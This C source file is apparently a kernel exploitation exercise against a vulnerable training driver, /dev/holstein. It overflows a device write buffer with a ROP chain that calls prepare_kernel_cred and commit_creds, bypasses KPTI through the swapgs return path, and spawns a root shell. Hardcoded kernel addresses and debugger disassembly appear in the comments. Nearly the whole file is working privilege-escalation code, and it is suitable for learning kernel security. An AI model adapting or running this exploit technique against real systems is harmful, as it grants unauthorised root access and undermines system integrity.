#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <liburing.h>
#include <pthread.h>

#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>

#include <linux/capability.h>
#include <linux/types.h>

#define DEBUG

#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

uint64_t user_rip;
uint64_t user_cs;
uint64_t user_rflags;
uint64_t user_rsp;
uint64_t user_ss;

void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    logOK("Got shell!");
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop qword ptr [rip+user_rflags];"
            ".att_syntax");

    user_rip = (uint64_t)(uintptr_t)get_shell;
    logInfo("Saved user state - RIP: 0x%lx, CS: 0x%lx, RFLAGS: 0x%lx, RSP: 0x%lx, SS: 0x%lx",
            user_rip, user_cs, user_rflags, user_rsp, user_ss);
}

/*
 * / # grep prepare_kernel_cred /proc/kallsyms
 * ffffffff8106e240 T prepare_kernel_cred
 * / # grep commit_creds /proc/kallsyms
 * ffffffff8106e390 T commit_creds
 */

#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds 0xffffffff8106e390

int main(int argc, char **argv, char **envp)
{
    save_state();

    int fd = open("/dev/holstein", O_RDWR); // Interact with the device module
    if (fd == -1)
        errExit("open /dev/holstein failed");

    /*
    pwndbg> x/12i 0xffffffff81800e10+22
    0xffffffff81800e26 <swapgs_restore_regs_and_return_to_usermode+22>:  mov    rdi,rsp
    0xffffffff81800e29 <swapgs_restore_regs_and_return_to_usermode+25>:  mov    rsp,QWORD PTR gs:0x6004
    0xffffffff81800e32 <swapgs_restore_regs_and_return_to_usermode+34>:  push   QWORD PTR [rdi+0x30]
    0xffffffff81800e35 <swapgs_restore_regs_and_return_to_usermode+37>:  push   QWORD PTR [rdi+0x28]
    0xffffffff81800e38 <swapgs_restore_regs_and_return_to_usermode+40>:  push   QWORD PTR [rdi+0x20]
    0xffffffff81800e3b <swapgs_restore_regs_and_return_to_usermode+43>:  push   QWORD PTR [rdi+0x18]
    0xffffffff81800e3e <swapgs_restore_regs_and_return_to_usermode+46>:  push   QWORD PTR [rdi+0x10]
    0xffffffff81800e41 <swapgs_restore_regs_and_return_to_usermode+49>:  push   QWORD PTR [rdi]
    0xffffffff81800e43 <swapgs_restore_regs_and_return_to_usermode+51>:  push   rax
    0xffffffff81800e44 <swapgs_restore_regs_and_return_to_usermode+52>:  xchg   ax,ax
    0xffffffff81800e46 <swapgs_restore_regs_and_return_to_usermode+54>:  mov    rdi,cr3
    0xffffffff81800e49 <swapgs_restore_regs_and_return_to_usermode+57>:  jmp    0xffffffff81800e7f <swapgs_restore_regs_and_return_to_usermode+111>
    pwndbg> x/6i 0xffffffff81800e7f
    0xffffffff81800e7f <swapgs_restore_regs_and_return_to_usermode+111>: or     rdi,0x1000
    0xffffffff81800e86 <swapgs_restore_regs_and_return_to_usermode+118>: mov    cr3,rdi
    0xffffffff81800e89 <swapgs_restore_regs_and_return_to_usermode+121>: pop    rax
    0xffffffff81800e8a <swapgs_restore_regs_and_return_to_usermode+122>: pop    rdi
    0xffffffff81800e8b <swapgs_restore_regs_and_return_to_usermode+123>: swapgs
    0xffffffff81800e8e <swapgs_restore_regs_and_return_to_usermode+126>: jmp    0xffffffff81800eb0 <native_iret>
    pwndbg> x/3i 0xffffffff81800eb0
    0xffffffff81800eb0 <native_iret>:    test   BYTE PTR [rsp+0x20],0x4
    0xffffffff81800eb5 <native_iret+5>:  jne    0xffffffff81800eb9 <native_irq_return_ldt>
    0xffffffff81800eb7 <native_irq_return_iret>: iretq
    */

    uint64_t bypass_kpti_chain = 0xffffffff81800e26;
    uint64_t pop_rdi = 0xffffffff812ef4c0;
    uint64_t pop_rcx = 0xffffffff812ea083;
    uint64_t mov_rdi_rax = 0xffffffff8160c96b;

    logInfo("Prepare a ROP payload");

    char buf[0x500];
    memset(buf, 0, 0x408);

    uint64_t idx = 0;
    uint64_t *rop = (uint64_t *)(buf + 0x408);

    rop[idx++] = pop_rdi; // return address
    rop[idx++] = 0;
    rop[idx++] = prepare_kernel_cred;
    rop[idx++] = pop_rcx; // Set rcx to 0 to avoid "rep movsq qword ptr [rdi], qword ptr [rsi]" in mov_rdi_rax
    rop[idx++] = 0;
    rop[idx++] = mov_rdi_rax;
    rop[idx++] = commit_creds;
    rop[idx++] = bypass_kpti_chain;
    rop[idx++] = 0;           // [rdi+0x0]
    rop[idx++] = 0;           // [rdi+0x8]
    rop[idx++] = user_rip;    // [rdi+0x10]
    rop[idx++] = user_cs;     // [rdi+0x18]
    rop[idx++] = user_rflags; // [rdi+0x20]
    rop[idx++] = user_rsp;    // [rdi+0x28]
    rop[idx++] = user_ss;     // [rdi+0x30]

    logInfo("Write a ROP payload");
    write(fd, buf, sizeof(buf));

    close(fd);
    return 0;
}
